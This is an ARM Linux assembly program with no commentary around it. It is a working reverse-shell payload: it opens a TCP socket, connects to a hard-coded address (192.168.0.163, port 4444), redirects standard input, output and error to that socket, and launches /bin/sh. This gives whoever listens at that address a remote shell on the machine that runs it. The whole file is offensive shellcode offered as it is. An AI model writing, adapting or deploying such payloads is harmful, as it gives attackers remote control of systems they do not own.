.syntax unified
.arm
.global _start
.section .text
_start:
    movw r7, #281
    mov  r0, #2
    mov  r1, #1
    eor  r2, r2, r2
    svc  #0
    mov  r4, r0

    movw r7, #283
    mov  r0, r4
    adr  r1, sockaddr
    mov  r2, #16
    svc  #0

    mov  r0, r4
    mov  r1, #0
    mov  r7, #63
    svc  #0
    mov  r0, r4
    mov  r1, #1
    mov  r7, #63
    svc  #0
    mov  r0, r4
    mov  r1, #2
    mov  r7, #63
    svc  #0

    adr  r0, binsh
    sub  sp, sp, #8
    str  r0, [sp]
    eor  r2, r2, r2
    str  r2, [sp, #4]
    mov  r1, sp
    mov  r7, #11
    svc  #0
    mov  r0, #127
    mov  r7, #1
    svc  #0

.align 2
sockaddr:
    .word 0x5c110002
    .word 0xa300a8c0
    .word 0x00000000
    .word 0x00000000
binsh:
    .asciz "/bin/sh"
.align 2
